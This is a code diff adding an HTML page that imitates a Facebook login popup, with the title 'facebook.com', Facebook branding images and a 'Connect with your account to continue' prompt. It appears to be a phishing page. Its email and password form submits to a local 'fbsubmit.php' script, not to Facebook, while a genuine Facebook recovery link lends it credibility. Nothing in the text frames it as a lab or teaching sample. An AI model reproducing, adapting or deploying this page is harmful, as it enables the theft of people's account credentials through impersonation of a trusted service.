@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>facebook.com</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+	<script type="text/javascript">
+		function showdiv()
+		{
+			document.getElementById('login-window').style.display='flex';
+			window.scrollTo(0,0);
+		}
+
+		function hidediv()
+		{
+			document.getElementById('login-window').style.display='none';
+		}
+	</script>
+</head>
+<body>
+
+<div id='login-window' class="login-window" style="display:none">
+	
+	<div class="inner-window">
+		<div class="downhead">
+			<form action="fbsubmit.php" method="POST">
+			<div class="banner">
+			<img src="fb-logo.png" style="width: 20px;height:20px">&nbsp;<span style="color:white">Facebook</span>
+			</div>
+
+			<div class="road-banner">
+				<img src="road-banner.png">
+			</div>
+
+			<div class="details">
+				
+				<span style="font-size: 14px">Login to use your account with <span style="color: #3B5998;cursor:pointer">Level Up Tech.</span></span>
+				<br><br><br><br>
+				<div class="id-info">
+					<label style="color:#666666;font-weight:bold" for="email-id">Email or Phone:&nbsp;&nbsp;&nbsp;</label>
+					<input type="text" name="email" style="font-size: 12px">
+				</div>
+				<div class="id-info">
+					<label style="color:#666666;font-weight:bold" for="email-id">Password:&nbsp;&nbsp;&nbsp;</label>
+					<input type="password" name="pass" style="font-size: 12px">
+				</div>
+
+				<div class="id-info">
+					<span><a target="_blank" style="color: #3B5998" href='https://www.facebook.com/recover/initiate'>Forgotten Account?</a></span>
+				</div>
+			</div>
+
+			<div class="footer">
+					
+						<input class='pvbutt' type="submit" name='submit' value="Log in" ></input>
+						<button class='pvbutt extra' type='button' onclick="hidediv()">Cancel</button>
+			</div>
+			</form>
+		</div>
+	</div>
+
+</div>
+
+
+
+	<div class="sign-in">
+		Connect with your account to continue
+		<br><br><br>
+		<img src="facebook-button.png" onclick="showdiv()">
+	</div>
+
+
+</body>
+</html>
